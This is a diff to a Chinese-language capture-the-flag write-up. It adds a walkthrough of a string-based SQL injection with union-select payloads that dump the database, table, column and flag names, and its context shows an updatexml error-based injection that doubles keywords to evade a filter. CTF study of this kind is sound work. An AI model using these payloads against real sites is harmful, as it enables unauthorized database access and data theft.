@@ -43,6 +43,27 @@ vim -r index.php --还原文件
 
 # 0X02 [SQL注入]
 
+## SQL注入-1
+
+尝试`id=1' and 1=2 --+` 页面无显示，`id=1' and 1=1 --+` 返回内容等于`id=1`,应该是字符型注入：
+![](pic/sql1_1.png)
+
+![](pic/sql1_2.png)
+
+尝试`id=1' and 1=1  order by 4--+` 页面无显示, 返回数据项为3项;
+
+相关playlod如下
+```
+--爆库名
+?id=99' union all select 1,2,database() --+
+--爆表
+?id=99' union all select 1,2,group_concat(table_name) from  information_schema.tables where table_schema=database() --+
+--爆列
+?id=99' union all select 1,2,group_concat(column_name) from  information_schema.columns where table_schema=database()  and table_name='fl4g'--+
+--爆值
+?id=99' union all select 1,2,fllllag from fl4g --+
+```
+
 ## SQL注入-2
 根据提示，访问login.php，并带上参数?tips=1 观察SQL报错信息，
 > name=test'&pass=123
@@ -72,6 +93,6 @@ name=test' and (updatexml('anything',concat('~',(selselectect group_concat(table
 --爆值
 name=test' and (updatexml('anything',concat('~',(selselectect flag from fl4g)),'anything'))# &pass=1 
   ```
-  
+
 ![](pic/sql2_2.png)
 ![](pic/sql2_3.png)
